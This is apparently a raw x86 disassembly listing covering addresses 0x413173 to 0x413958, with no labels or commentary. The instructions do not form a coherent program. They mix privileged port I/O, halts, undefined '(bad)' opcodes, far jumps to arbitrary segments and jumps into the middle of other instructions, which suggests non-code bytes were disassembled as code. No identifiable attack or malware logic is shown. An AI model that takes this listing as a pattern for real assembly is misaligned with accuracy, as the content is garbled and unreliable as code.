  413173:	data16 sub BYTE PTR [eax-0x46a96e69],bl
  41317a:	or     al,0x8
  41317c:	or     al,0x3b
  41317e:	pop    eax
  41317f:	jo     0x41313e
  413181:	pusha  
  413182:	in     eax,dx
  413183:	cmp    edi,DWORD PTR [edi+0x54cddcdf]
  413189:	and    DWORD PTR [ecx+0x22],ebx
  41318c:	mov    ebx,0xfb6bb0ab
  413191:	or     DWORD PTR gs:[esp+eax*4-0x2ea033ad],edx
  413199:	inc    esi
  41319a:	pushf  
  41319b:	bound  eax,QWORD PTR [ebp-0x75a6e5e]
  4131a1:	or     eax,0x5a3739a
  4131a6:	shr    bh,0xa1
  4131a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131aa:	bound  esp,QWORD PTR [edx+0x66]
  4131ad:	sar    ebp,cl
  4131af:	adc    al,0x1b
  4131b1:	aad    0x44
  4131b3:	stc    
  4131b4:	nop
  4131b5:	push   ds
  4131b6:	dec    ebp
  4131b7:	or     DWORD PTR [eax-0xe2cb1dd],0xf5069700
  4131c1:	je     0x41318a
  4131c3:	clc    
  4131c4:	xor    BYTE PTR [ebx],al
  4131c6:	push   ss
  4131c7:	jno    0x413183
  4131c9:	xor    DWORD PTR [edx],0xd9e263dd
  4131cf:	sub    al,0x62
  4131d1:	push   esp
  4131d2:	mov    al,ds:0xbcdc6a97
  4131d7:	ret    0xe946
  4131da:	cmp    eax,0x90f612fa
  4131df:	call   0x3fff023e
  4131e4:	out    dx,eax
  4131e5:	js     0x41323d
  4131e7:	jns    0x4131f3
  4131e9:	popf   
  4131ea:	or     ebp,DWORD PTR [eax+0x7d]
  4131ed:	nop
  4131ee:	xor    dl,bh
  4131f0:	dec    ebp
  4131f1:	jg     0x4131ea
  4131f3:	test   BYTE PTR [ecx-0x25c7bcc7],bh
  4131f9:	in     eax,dx
  4131fa:	sbb    al,0xec
  4131fc:	inc    esp
  4131fd:	lea    esp,[eax-0x50]
  413200:	cmc    
  413201:	dec    esi
  413202:	retf   0xabea
  413205:	call   DWORD PTR [ebx-0x7e0e054e]
  41320b:	sub    ebx,DWORD PTR [ebx+0x4388fa4b]
  413211:	pop    eax
  413212:	jno    0x41328e
  413214:	xor    edi,0x20
  413217:	hlt    
  413218:	pop    es
  413219:	outs   dx,DWORD PTR ds:[esi]
  41321a:	ds xchg ebp,eax
  41321c:	jb     0x4131cf
  41321e:	sbb    al,0x98
  413220:	test   eax,0xe8ae3ee4
  413225:	cs fs jne 0x413252
  413229:	loope  0x413291
  41322b:	ds push ebx
  41322d:	or     BYTE PTR [edi-0x43],cl
  413230:	outs   dx,BYTE PTR ds:[esi]
  413231:	aam    0xd9
  413233:	outs   dx,DWORD PTR ds:[esi]
  413234:	cs cli 
  413236:	inc    esp
  413237:	js     0x41320f
  413239:	into   
  41323a:	lea    ebx,[edi]
  41323c:	mov    al,ds:0x1b02947f
  413241:	stos   BYTE PTR es:[edi],al
  413242:	push   0xa86849fb
  413247:	aaa    
  413248:	enter  0xd7c0,0xae
  41324c:	fs add eax,0x5338ba34
  413252:	mov    dh,0x21
  413254:	pop    esi
  413255:	scas   al,BYTE PTR es:[edi]
  413256:	jb     0x4132ce
  413258:	dec    esp
  413259:	add    al,0xa0
  41325b:	ret    
  41325c:	mov    edx,DWORD PTR [edx+eax*2-0x7e]
  413260:	pop    esp
  413261:	iret   
  413262:	inc    esi
  413263:	adc    dh,ah
  413265:	pop    ds
  413266:	call   esi
  413268:	and    ecx,DWORD PTR ds:0x8facf65c
  41326e:	sub    eax,0x8fa5bb3a
  413273:	shr    DWORD PTR [eax+edi*4],cl
  413276:	cwde   
  413277:	inc    edi
  413278:	pop    edx
  413279:	mov    dh,0x57
  41327b:	ret    0x54f2
  41327e:	xlat   BYTE PTR ds:[ebx]
  41327f:	dec    ecx
  413280:	or     ebp,DWORD PTR [edx]
  413282:	lods   al,BYTE PTR ds:[esi]
  413283:	ror    DWORD PTR [ebx],0x64
  413286:	mov    edx,esp
  413288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413289:	out    dx,al
  41328a:	mov    ss,WORD PTR [esi+0x2d]
  41328d:	lods   al,BYTE PTR ds:[esi]
  41328e:	add    cl,BYTE PTR [ebp+0x3f9707b8]
  413294:	xor    al,0x98
  413296:	pop    esi
  413297:	mov    ch,0xb1
  413299:	jbe    0x413238
  41329b:	push   ebx
  41329c:	sub    eax,0x6694118d
  4132a1:	xchg   ebx,eax
  4132a2:	sbb    al,0x16
  4132a4:	test   eax,0x901e945d
  4132a9:	leave  
  4132aa:	push   edx
  4132ab:	xchg   DWORD PTR [ebp-0x40642de],edx
  4132b1:	pusha  
  4132b2:	test   BYTE PTR [ebp+ecx*2+0x6da23073],0xb
  4132ba:	stos   DWORD PTR es:[edi],eax
  4132bb:	xchg   esi,eax
  4132bc:	in     al,0xf8
  4132be:	stos   BYTE PTR es:[edi],al
  4132bf:	and    eax,0xe5c06815
  4132c4:	hlt    
  4132c5:	(bad)
  4132c8:	cwde   
  4132c9:	sbb    DWORD PTR [ebp-0x16],ebx
  4132cc:	mov    al,ds:0xebf38e68
  4132d1:	outs   dx,BYTE PTR ds:[esi]
  4132d2:	imul   ebx,DWORD PTR [ebx+ebp*1+0x77],0x2e9fa6df
  4132da:	mov    BYTE PTR ds:0xb49017e0,ah
  4132e0:	pop    ebp
  4132e1:	cs push gs
  4132e4:	adc    BYTE PTR [ecx+0x22],dl
  4132e7:	xchg   ebp,eax
  4132e8:	pop    edi
  4132e9:	(bad)  
  4132ea:	mov    dl,0xf5
  4132ec:	int3   
  4132ed:	jle    0x4132af
  4132ef:	xchg   BYTE PTR [edx],ah
  4132f1:	push   ebp
  4132f2:	mov    ah,0x39
  4132f4:	add    DWORD PTR [edx],ebx
  4132f6:	pop    ds
  4132f7:	mov    ss,WORD PTR [edi+0x1739de36]
  4132fd:	das    
  4132fe:	and    al,0x14
  413300:	push   ds
  413301:	pop    ds
  413302:	jo     0x41333f
  413304:	and    BYTE PTR [edi],bl
  413306:	repnz pop es
  413308:	mov    cl,BYTE PTR [ecx+esi*2+0x69]
  41330c:	rcl    DWORD PTR [ebx-0x261c244],1
  413312:	pcmpeqd mm2,QWORD PTR [edx+eiz*2]
  413316:	cmp    cl,BYTE PTR [esi+esi*2]
  413319:	clc    
  41331a:	sub    ebx,eax
  41331c:	mov    ds:0x7e67967,al
  413321:	sbb    dl,BYTE PTR [ebx]
  413323:	std    
  413324:	clc    
  413325:	mov    ecx,0x5ed871ed
  41332a:	lds    eax,FWORD PTR [ecx]
  41332c:	lock inc esp
  41332e:	leave  
  41332f:	add    dh,dl
  413331:	mov    ah,0xac
  413333:	es rcl al,0x80
  413337:	jmp    0x972c8697
  41333c:	imul   ebp,DWORD PTR [ecx+0x2870cd9],0xfb60f943
  413346:	mov    dl,0xbd
  413348:	gs jns 0x413308
  41334b:	jns    0x413394
  41334d:	pop    esp
  41334e:	js     0x4133b8
  413350:	cmp    ch,BYTE PTR [edx]
  413352:	leave  
  413353:	sbb    ebp,DWORD PTR [ebx]
  413355:	mov    ds:0xf2e08209,al
  41335a:	inc    esp
  41335b:	repz shl DWORD PTR [edi+0x26],cl
  41335f:	xor    DWORD PTR [ecx+0x7d],eax
  413362:	imul   edx,esi,0xc2ce9df4
  413368:	dec    eax
  413369:	dec    esp
  41336a:	(bad)  [eax-0xe]
  41336d:	push   edx
  41336e:	sbb    BYTE PTR [edi-0x7b],bh
  413371:	fwait
  413372:	out    0xa0,eax
  413374:	je     0x413347
  413376:	aam    0x3e
  413378:	pushf  
  413379:	in     eax,0x82
  41337b:	fwait
  41337c:	cmp    DWORD PTR [eax-0x18238f8c],0xffffffcb
  413383:	nop
  413384:	scas   al,BYTE PTR es:[edi]
  413385:	dec    ebx
  413386:	mov    edi,0xac006399
  41338b:	lods   eax,DWORD PTR ds:[esi]
  41338c:	or     BYTE PTR [ebp-0x362144bc],cl
  413392:	dec    esp
  413393:	js     0x413343
  413395:	and    ecx,esi
  413397:	or     bh,bh
  413399:	scas   al,BYTE PTR es:[edi]
  41339a:	outs   dx,DWORD PTR ds:[esi]
  41339b:	xor    eax,0x870b13be
  4133a0:	(bad)  
  4133a1:	jo     0x413354
  4133a3:	mov    dh,0xef
  4133a5:	cmp    BYTE PTR [edx],bh
  4133a7:	mov    edx,0x7bab95ee
  4133ac:	xchg   ebp,eax
  4133ad:	aam    0xd1
  4133af:	test   eax,0xc8eb8f19
  4133b4:	jb     0x4133e1
  4133b6:	pop    ebx
  4133b7:	push   edi
  4133b8:	std    
  4133b9:	xor    bh,BYTE PTR [edi]
  4133bb:	add    eax,0xfd252d5f
  4133c0:	xor    BYTE PTR [esi-0x25],bh
  4133c3:	jl     0x4133f7
  4133c5:	mov    esp,0x7501bbb9
  4133ca:	adc    al,0xaa
  4133cc:	sub    DWORD PTR [ebx+0x5e647e87],edx
  4133d2:	pop    esp
  4133d3:	fs aaa 
  4133d5:	adc    eax,0x8563cd74
  4133da:	xor    ch,BYTE PTR [eax-0x3]
  4133dd:	or     al,0x32
  4133df:	add    eax,0x68db55ef
  4133e4:	lds    eax,FWORD PTR [ebx+0x53]
  4133e7:	outs   dx,DWORD PTR ds:[esi]
  4133e8:	inc    eax
  4133e9:	imul   ebx,DWORD PTR [edi+0x4999724f],0xd8917675
  4133f3:	or     BYTE PTR [ecx-0x7f],bh
  4133f6:	je     0x41346f
  4133f8:	jno    0x4133b7
  4133fa:	bound  edi,QWORD PTR [esi-0x3f]
  4133fd:	push   cs
  4133fe:	add    ch,bh
  413400:	dec    ecx
  413401:	or     bh,BYTE PTR ds:0xa32c0b70
  413407:	push   es
  413408:	xor    edx,DWORD PTR [esi]
  41340a:	mov    cl,0x71
  41340c:	ss xchg esi,eax
  41340e:	fist   WORD PTR [edi-0x1132cf68]
  413414:	jno    0x4133a8
  413416:	add    ebx,edi
  413418:	jl     0x41347c
  41341a:	cmp    BYTE PTR [esi-0x1a],ah
  41341d:	inc    esp
  41341e:	pop    ebx
  41341f:	adc    al,0xa4
  413421:	mov    edx,0x43cba665
  413426:	call   0xfef64bae
  41342b:	rol    DWORD PTR [ebx],1
  41342d:	fisubr WORD PTR [edx]
  41342f:	lds    eax,FWORD PTR [edi+0x58c0f3f4]
  413435:	inc    edx
  413436:	lds    esi,FWORD PTR [edx+0x2f]
  413439:	fistp  QWORD PTR [edi+0x5a]
  41343c:	retf   
  41343d:	xchg   esi,eax
  41343e:	popa   
  41343f:	jp     0x413457
  413441:	fmul   DWORD PTR [ebp+0x1d4052fe]
  413447:	or     eax,0x1bee3e7e
  41344c:	mov    eax,0x43e779e6
  413451:	das    
  413452:	scas   eax,DWORD PTR es:[edi]
  413453:	and    al,0x6c
  413455:	cmp    BYTE PTR [esi+0x53],0x7
  413459:	xor    eax,0xb069344
  41345e:	jp     0x41340d
  413460:	sub    al,0x50
  413462:	scas   eax,DWORD PTR es:[edi]
  413463:	lahf   
  413464:	xor    BYTE PTR [edi],dh
  413466:	fsub   DWORD PTR [eax-0x22]
  413469:	fwait
  41346a:	jle    0x413437
  41346c:	cmp    dh,dh
  41346e:	fst    st(4)
  413470:	nop
  413471:	retf   
  413472:	mov    eax,0xdf464d65
  413477:	add    DWORD PTR [edx-0xa2d8c33],0x27
  41347e:	dec    edx
  41347f:	ja     0x413424
  413481:	pop    esi
  413482:	iret   
  413483:	fcomp  st(7)
  413485:	test   eax,0x192abce8
  41348a:	add    BYTE PTR [eax],dh
  41348c:	fmul   DWORD PTR [edx-0xf0fdd44]
  413492:	(bad)  [ecx-0x80]
  413495:	push   ecx
  413496:	sub    DWORD PTR [ecx+edx*8+0x3b],ebx
  41349a:	cmc    
  41349b:	jecxz  0x4134ef
  41349d:	rcl    DWORD PTR [ebp-0x2b5121e3],1
  4134a3:	pop    ss
  4134a4:	les    esp,FWORD PTR [ebp-0x49]
  4134a7:	xchg   DWORD PTR [ecx+0x54],edx
  4134aa:	scas   eax,DWORD PTR es:[edi]
  4134ab:	mov    bl,BYTE PTR [esi+0x2]
  4134ae:	xchg   ecx,eax
  4134af:	mov    esp,DWORD PTR [esi-0x506f6e5f]
  4134b5:	lock jo 0x4134f8
  4134b8:	add    BYTE PTR [ebx-0x1248bebc],ch
  4134be:	or     dl,bl
  4134c0:	ja     0x413459
  4134c2:	jge    0x4134f1
  4134c4:	mov    ch,0xc5
  4134c6:	or     eax,0xded1ed02
  4134cb:	sbb    DWORD PTR [edx+0x61],0x52
  4134cf:	or     DWORD PTR [esi+0x4],edx
  4134d2:	jno    0x4134a2
  4134d4:	fbld   TBYTE PTR [edx+0x2a]
  4134d7:	adc    dh,BYTE PTR [eax+0x1c1cdb2d]
  4134dd:	mov    esi,0x2f2238d8
  4134e2:	fistp  DWORD PTR [ebp+ebx*2+0x6132e5e8]
  4134e9:	add    bh,ch
  4134eb:	not    BYTE PTR [edx-0x1505996e]
  4134f1:	inc    eax
  4134f2:	enter  0xcd49,0x88
  4134f6:	fwait
  4134f7:	jl     0x413508
  4134f9:	sbb    BYTE PTR [eax],bh
  4134fb:	call   0x9e890fd
  413500:	or     eax,0x32196e72
  413505:	shl    BYTE PTR [edx],1
  413507:	push   esp
  413508:	mov    al,ds:0xb4955aad
  41350d:	cmp    esp,DWORD PTR [edx-0x35]
  413510:	nop
  413511:	stc    
  413512:	ss int 0x8c
  413515:	inc    ebx
  413516:	dec    esp
  413517:	mov    ch,BYTE PTR [ebx]
  413519:	adc    ebx,eax
  41351b:	(bad)  
  41351d:	dec    edi
  41351e:	sbb    al,0xb4
  413520:	pop    ebp
  413521:	lock lea edi,[edx-0x11529007]
  413528:	loope  0x41359f
  41352a:	xor    DWORD PTR ds:0xdcd84538,ecx
  413530:	gs mov bl,0x7a
  413533:	daa    
  413534:	jmp    0xf0eb1139
  413539:	xchg   BYTE PTR [edx],cl
  41353b:	dec    ebx
  41353c:	pop    ebx
  41353d:	out    0xe7,al
  41353f:	loop   0x4134d5
  413541:	mov    edx,0x29977d66
  413546:	test   ax,0xbe59
  41354a:	gs (bad) 
  41354c:	sbb    bh,BYTE PTR [edi+0x59]
  41354f:	addr16 push ecx
  413551:	jge    0x413584
  413553:	iret   
  413554:	push   esp
  413555:	add    esp,DWORD PTR [ebp+0x32636e79]
  41355b:	mov    bh,0xc3
  41355d:	loopne 0x413550
  41355f:	sub    eax,0x734aa797
  413564:	cs out 0x4d,eax
  413567:	out    0x78,eax
  413569:	inc    ebp
  41356a:	ins    DWORD PTR es:[edi],dx
  41356b:	cmp    dh,BYTE PTR [eax+0x71bdc277]
  413571:	mov    ds:0xe0513055,eax
  413576:	pop    esp
  413577:	adc    eax,0x7988bde0
  41357c:	jb     0x413567
  41357e:	stc    
  41357f:	mov    al,0x81
  413581:	(bad)  
  413582:	lds    esi,FWORD PTR [ecx-0x26]
  413585:	mov    ebp,0xc08407d7
  41358a:	(bad)  
  41358b:	js     0x4135e1
  41358d:	(bad)  
  41358f:	shl    DWORD PTR [edi+0x2b81701f],1
  413595:	jl     0x41359e
  413597:	mov    esp,0x95ef11f5
  41359c:	clc    
  41359d:	mov    ebp,0x37ea4f3d
  4135a2:	loop   0x413597
  4135a4:	xchg   BYTE PTR [edi],ah
  4135a6:	shr    BYTE PTR ds:[ebp+0x2641a743],1
  4135ad:	jl     0x41361c
  4135af:	cmp    cl,BYTE PTR [eax]
  4135b1:	sbb    dl,BYTE PTR [ebx+eax*8+0x16]
  4135b5:	push   ecx
  4135b6:	ss pop ebp
  4135b8:	aad    0x74
  4135ba:	mov    ebp,0xf7a3327f
  4135bf:	test   al,0x42
  4135c1:	into   
  4135c2:	ret    0xc8d6
  4135c5:	pop    esi
  4135c6:	mov    ch,BYTE PTR [ebx]
  4135c8:	sar    BYTE PTR [esp+ebp*8],cl
  4135cb:	imul   eax,DWORD PTR [edi],0x11
  4135ce:	cs test al,0xc9
  4135d1:	dec    edi
  4135d2:	call   0xc1e6:0x4cbf4e5
  4135d9:	push   es
  4135da:	clc    
  4135db:	xchg   edi,eax
  4135dc:	xchg   ebp,eax
  4135dd:	inc    ebx
  4135de:	mov    edi,0x6ada8174
  4135e3:	bnd jp 0x41365a
  4135e6:	xchg   edi,eax
  4135e7:	push   cs
  4135e8:	mov    eax,0xc6038878
  4135ed:	dec    eax
  4135ee:	mov    al,0x5
  4135f0:	test   DWORD PTR [ebx-0x7f],0xf9b2bb08
  4135f7:	cmp    DWORD PTR es:[ebp+0x3d],ecx
  4135fb:	or     cl,dh
  4135fd:	in     al,dx
  4135fe:	icebp  
  4135ff:	xor    esp,edx
  413601:	xor    DWORD PTR [edi+0x1f5a4b2f],edi
  413607:	inc    esi
  413608:	adc    al,dh
  41360a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41360b:	and    eax,0x1af5e44a
  413610:	mov    WORD PTR [edi+0x1e1db2fa],?
  413616:	popf   
  413617:	div    cl
  413619:	fnstsw WORD PTR [ecx]
  41361b:	test   DWORD PTR es:[eax-0x6605e8ad],0x11875d2
  413626:	mov    eax,ds:0xe964a175
  41362b:	fmul   QWORD PTR [eax+0x4facddea]
  413631:	rcl    BYTE PTR [eax-0x53],0x49
  413635:	in     eax,0x0
  413637:	or     ebx,DWORD PTR [ebp-0x4a]
  41363a:	mov    ah,0x9b
  41363c:	rcr    ebx,cl
  41363e:	lds    ecx,FWORD PTR fs:[edi-0x42]
  413642:	out    dx,eax
  413643:	fistp  WORD PTR [ebx]
  413645:	or     bh,ch
  413647:	fwait
  413648:	lods   al,BYTE PTR ds:[esi]
  413649:	dec    eax
  41364a:	add    BYTE PTR [ecx-0x594fdac8],ch
  413650:	ins    BYTE PTR es:[edi],dx
  413651:	outs   dx,BYTE PTR ds:[esi]
  413652:	mov    ch,BYTE PTR [edx+edx*1]
  413655:	dec    esp
  413656:	and    eax,0xdccb0cea
  41365b:	enter  0x532b,0x80
  41365f:	xchg   esp,eax
  413660:	xor    eax,0x3a57383a
  413665:	mov    eax,0x663e76f3
  41366a:	int    0x3c
  41366c:	dec    esi
  41366d:	and    al,0xc6
  41366f:	pop    ebx
  413670:	hlt    
  413671:	adc    al,0x83
  413673:	call   0x6fa9cb80
  413678:	cmp    BYTE PTR [ebx+0x2dc3e21c],bl
  41367e:	outs   dx,BYTE PTR ds:[esi]
  41367f:	cli    
  413680:	shr    DWORD PTR [ecx+0x22],0x6a
  413684:	dec    edi
  413685:	inc    ebp
  413686:	mov    al,ds:0xc738f55c
  41368b:	mov    edx,0x5cfd3608
  413690:	into   
  413691:	inc    ecx
  413692:	gs mov dl,0x83
  413695:	ret    0x1ac7
  413698:	ret    
  413699:	stos   BYTE PTR es:[edi],al
  41369a:	sub    bh,BYTE PTR [ebp+0x15]
  41369d:	retf   0x2ecc
  4136a0:	dec    eax
  4136a1:	bound  ebp,QWORD PTR [ebp+0x3e]
  4136a4:	ret    
  4136a5:	sub    esp,DWORD PTR [eax+0x4a]
  4136a8:	pop    esi
  4136a9:	loopne 0x4136bf
  4136ab:	push   ds
  4136ac:	dec    ecx
  4136ad:	dec    eax
  4136ae:	aam    0xa9
  4136b0:	mov    dl,0x98
  4136b2:	xchg   esi,eax
  4136b3:	dec    esp
  4136b4:	test   BYTE PTR [edi-0x1597c5b5],bl
  4136ba:	and    ch,BYTE PTR [edi-0x45]
  4136bd:	fist   WORD PTR [esi-0x4dc93503]
  4136c3:	outs   dx,DWORD PTR ds:[esi]
  4136c4:	pop    esp
  4136c5:	(bad)  
  4136c6:	je     0x4136ec
  4136c8:	fcmovnu st,st(1)
  4136ca:	mov    BYTE PTR [eax+0xf40141f],0xcd
  4136d1:	pop    ebx
  4136d2:	xlat   BYTE PTR ds:[ebx]
  4136d3:	dec    eax
  4136d4:	cdq    
  4136d5:	arpl   WORD PTR [edx+0x62],dx
  4136d8:	inc    edx
  4136d9:	das    
  4136da:	daa    
  4136db:	sar    esp,0x17
  4136de:	and    BYTE PTR [edi],ah
  4136e0:	pusha  
  4136e1:	rdpmc  
  4136e3:	out    dx,eax
  4136e4:	xchg   ebp,eax
  4136e5:	sub    ecx,edx
  4136e7:	adc    al,0x97
  4136e9:	loopne 0x413752
  4136eb:	push   ds
  4136ec:	out    0x4c,eax
  4136ee:	in     eax,dx
  4136ef:	adc    ecx,DWORD PTR [ebx-0x7ca0ed7f]
  4136f5:	inc    ebx
  4136f6:	mov    ds:0xb7d24b9e,al
  4136fb:	xchg   ebp,eax
  4136fc:	pop    ebp
  4136fd:	(bad)  
  4136fe:	stc    
  4136ff:	add    BYTE PTR [edi+0x4],ch
  413702:	ins    DWORD PTR es:[edi],dx
  413703:	xchg   ebx,eax
  413704:	ror    BYTE PTR [edx+0x38884fc5],0x71
  41370b:	out    0x16,eax
  41370d:	ror    ah,cl
  41370f:	jo     0x41370b
  413711:	test   BYTE PTR [esi+edx*8+0xba804],0xc0
  413719:	das    
  41371a:	mov    ebx,ebp
  41371c:	push   eax
  41371d:	sbb    edx,DWORD PTR [eax-0x785bc87a]
  413723:	jnp    0x41379d
  413725:	xor    DWORD PTR [eax+0x3b],eax
  413728:	sbb    DWORD PTR [esi+edx*1-0x305f7612],eax
  41372f:	inc    esi
  413730:	fisub  WORD PTR [ecx]
  413732:	cmp    BYTE PTR [ecx],ch
  413734:	out    0x97,eax
  413736:	shl    DWORD PTR [esi],1
  413738:	dec    esi
  413739:	les    ebp,FWORD PTR [edi-0x46]
  41373c:	xor    BYTE PTR [edi],dh
  41373e:	mov    ah,0xba
  413740:	cmc    
  413741:	pop    ebp
  413742:	jne    0x4136da
  413744:	mov    eax,0xa40ac1b0
  413749:	jmp    0x57e66e0c
  41374e:	fbld   TBYTE PTR [esi]
  413750:	mov    bh,0xd9
  413752:	out    dx,al
  413753:	ror    DWORD PTR [ebp+esi*8+0x41],0x1f
  413758:	inc    ebx
  413759:	jo     0x4137ce
  41375b:	icebp  
  41375c:	xor    esi,edi
  41375e:	(bad)  
  41375f:	lods   al,BYTE PTR ds:[esi]
  413760:	pop    edx
  413761:	push   ecx
  413762:	aas    
  413763:	xchg   edi,eax
  413764:	inc    eax
  413765:	mov    bl,0xa
  413767:	or     al,0xa
  413769:	mov    ebp,0xa52e471f
  41376e:	and    esp,ebx
  413770:	and    ah,ch
  413772:	mov    ah,0x34
  413774:	pop    es
  413775:	ins    DWORD PTR es:[edi],dx
  413776:	jmp    0x413772
  413778:	jmp    0x644d:0x73454658
  41377f:	dec    ebp
  413780:	ret    
  413781:	pushf  
  413782:	shl    BYTE PTR [esi],1
  413784:	and    al,BYTE PTR [eax+esi*2+0x36]
  413788:	sbb    al,BYTE PTR [esi]
  41378a:	imul   edi,DWORD PTR [edi+0x3eb8f5d8],0xab83f5fd
  413794:	pop    eax
  413795:	add    edx,eax
  413797:	out    0x6a,eax
  413799:	stc    
  41379a:	rol    BYTE PTR [ebp+0x4bd284f],0x5b
  4137a1:	inc    esp
  4137a2:	xor    ebx,DWORD PTR [ebx-0x13]
  4137a5:	sbb    eax,0x3b195a47
  4137aa:	(bad)  
  4137ab:	call   0x48cc:0x781c0b22
  4137b2:	pop    edi
  4137b3:	cmc    
  4137b4:	cmc    
  4137b5:	(bad)  
  4137b6:	jns    0x413760
  4137b8:	loop   0x4137c8
  4137ba:	call   0x583a:0xed87077e
  4137c1:	lods   eax,DWORD PTR ds:[esi]
  4137c2:	data16 (bad) 
  4137c4:	xor    eax,DWORD PTR [esp+ecx*4+0x40]
  4137c8:	in     al,0x8e
  4137ca:	mov    DWORD PTR [ebx],edi
  4137cc:	idiv   BYTE PTR [eax]
  4137ce:	inc    ebx
  4137cf:	and    al,0xf3
  4137d1:	or     DWORD PTR [ebx+ecx*4-0x413a7721],0x61
  4137d9:	outs   dx,BYTE PTR ds:[esi]
  4137da:	inc    ecx
  4137db:	das    
  4137dc:	pop    esp
  4137dd:	fisub  DWORD PTR [ecx-0x74]
  4137e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137e1:	das    
  4137e2:	loopne 0x41383e
  4137e4:	xchg   edi,eax
  4137e5:	dec    esp
  4137e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e7:	push   eax
  4137e8:	mov    cs,ebp
  4137ea:	dec    esp
  4137eb:	xchg   ebx,eax
  4137ec:	ret    
  4137ed:	or     ch,BYTE PTR [ebp-0xc]
  4137f0:	xor    bh,bh
  4137f2:	fmul   DWORD PTR [edx-0x23072511]
  4137f8:	adc    al,0x70
  4137fa:	sbb    edi,DWORD PTR [ecx-0x39]
  4137fd:	jb     0x413815
  4137ff:	mov    esi,0x429e4d4e
  413804:	inc    ebx
  413805:	push   ecx
  413806:	adc    BYTE PTR [ecx],dl
  413808:	popa   
  413809:	xchg   edx,eax
  41380a:	outs   dx,DWORD PTR ds:[esi]
  41380b:	push   edx
  41380c:	jmp    0x3f4edd53
  413811:	pop    ds
  413812:	inc    esp
  413813:	or     ch,dl
  413815:	xor    al,BYTE PTR [eax]
  413817:	push   ebp
  413818:	test   eax,0x57cb612b
  41381d:	in     eax,0xc6
  41381f:	cwde   
  413820:	(bad)  
  413821:	pop    ds
  413822:	push   ebp
  413823:	popa   
  413824:	add    al,0xc6
  413826:	test   ch,ch
  413828:	shr    DWORD PTR [ecx],0xbf
  41382b:	std    
  41382c:	or     eax,DWORD PTR [eax+0x4f]
  41382f:	jns    0x413811
  413831:	sub    eax,0x565afde3
  413836:	fs sub eax,0xe92866fd
  41383c:	mov    ebp,DWORD PTR [esi+eiz*4+0x265cabd4]
  413843:	jmp    0xa27e:0x2a796ac6
  41384a:	mov    ebp,0x2146a174
  41384f:	push   ds
  413850:	push   es
  413851:	pop    edx
  413852:	data16 fimul WORD PTR [ecx+0x10a56e62]
  413859:	inc    ebp
  41385a:	fisttp QWORD PTR [esi]
  41385c:	dec    ebp
  41385d:	fcomp  QWORD PTR [eax+0x151e7840]
  413863:	popa   
  413864:	popf   
  413865:	adc    al,0xca
  413867:	out    dx,al
  413868:	retf   
  413869:	add    eax,ebx
  41386b:	div    BYTE PTR [esi-0x14365b75]
  413871:	lock pop ss
  413873:	or     eax,0x3e606f4a
  413878:	jl     0x413807
  41387a:	sub    ebx,esi
  41387c:	mov    DWORD PTR [esi],0x7064750a
  413882:	iret   
  413883:	outs   dx,DWORD PTR ds:[esi]
  413884:	xchg   ebp,eax
  413885:	adc    edi,DWORD PTR [edi]
  413887:	sub    al,BYTE PTR [ecx]
  413889:	cld    
  41388a:	push   eax
  41388b:	cwde   
  41388c:	or     BYTE PTR [esi+0x7b],bh
  41388f:	(bad)
  413893:	sub    al,0xf
  413896:	mov    dl,0xc
  413898:	in     eax,0xf6
  41389a:	ins    DWORD PTR es:[edi],dx
  41389b:	pop    ds
  41389c:	shl    BYTE PTR [edx+0x46],0xdc
  4138a0:	jl     0x413915
  4138a2:	shl    DWORD PTR [esi+0x34259ffa],1
  4138a8:	push   ecx
  4138a9:	add    dh,BYTE PTR [edx]
  4138ab:	jg     0x41384b
  4138ad:	cld    
  4138ae:	adc    dl,0x39
  4138b1:	not    DWORD PTR [edx+0x5daa424a]
  4138b7:	shl    ebp,1
  4138b9:	xchg   ebp,eax
  4138ba:	fld    TBYTE PTR [ebx-0x2d]
  4138bd:	ds ja  0x413841
  4138c0:	jmp    0x41390a
  4138c2:	retf   0xd905
  4138c5:	adc    eax,0xdeb7aa8c
  4138ca:	push   es
  4138cb:	or     DWORD PTR [esi+edx*4+0x6df8a4b5],edi
  4138d2:	fucomip st,st(5)
  4138d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d5:	and    eax,0xe49363bd
  4138da:	cld    
  4138db:	jmp    0xc958:0xaeedc6df
  4138e2:	mov    ds:0xc0ff5c1b,eax
  4138e7:	out    0x8e,eax
  4138e9:	popf   
  4138ea:	iret   
  4138eb:	fsubr  DWORD PTR [edx+ebp*1-0x58]
  4138ef:	sub    al,0xc6
  4138f1:	sub    ch,cl
  4138f3:	xlat   BYTE PTR ds:[ebx]
  4138f4:	dec    edx
  4138f5:	inc    DWORD PTR [eax]
  4138f7:	fld    st(7)
  4138f9:	xchg   esp,eax
  4138fa:	inc    esp
  4138fb:	nop
  4138fc:	mov    ebp,DWORD PTR ds:0x5a86dd06
  413902:	xchg   esi,eax
  413903:	lock outs dx,DWORD PTR ds:[esi]
  413905:	(bad)  
  413906:	stos   DWORD PTR es:[edi],eax
  413907:	jno    0x413957
  413909:	pop    esp
  41390a:	sub    ax,0xc043
  41390e:	or     eax,0xe9c4d4bc
  413913:	push   ss
  413914:	cdq    
  413915:	adc    eax,0xd404c6a7
  41391a:	add    al,0xf
  41391c:	aaa    
  41391d:	stos   BYTE PTR es:[edi],al
  41391e:	xor    esi,DWORD PTR [ebx+0x76f06f49]
  413924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413925:	push   ecx
  413926:	pop    edi
  413927:	fcmovne st,st(1)
  413929:	jmp    ebx
  41392b:	jg     0x41397c
  41392d:	jnp    0x413953
  41392f:	xlat   BYTE PTR ds:[ebx]
  413930:	sbb    esi,edx
  413932:	ja     0x4138fb
  413934:	pop    ss
  413935:	mov    ebx,0xbccf7bf1
  41393a:	sub    dh,BYTE PTR [ecx]
  41393c:	sub    eax,0x191a3326
  413941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413942:	loopne 0x4138dd
  413944:	mov    al,0x29
  413946:	out    0x3d,eax
  413948:	lock lahf 
  41394a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41394b:	sub    eax,0x8b5dc4ec
  413950:	inc    esp
  413951:	dec    eax
  413952:	ss (bad) 
  413954:	or     al,0x1c
  413956:	sub    bh,dl
  413958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
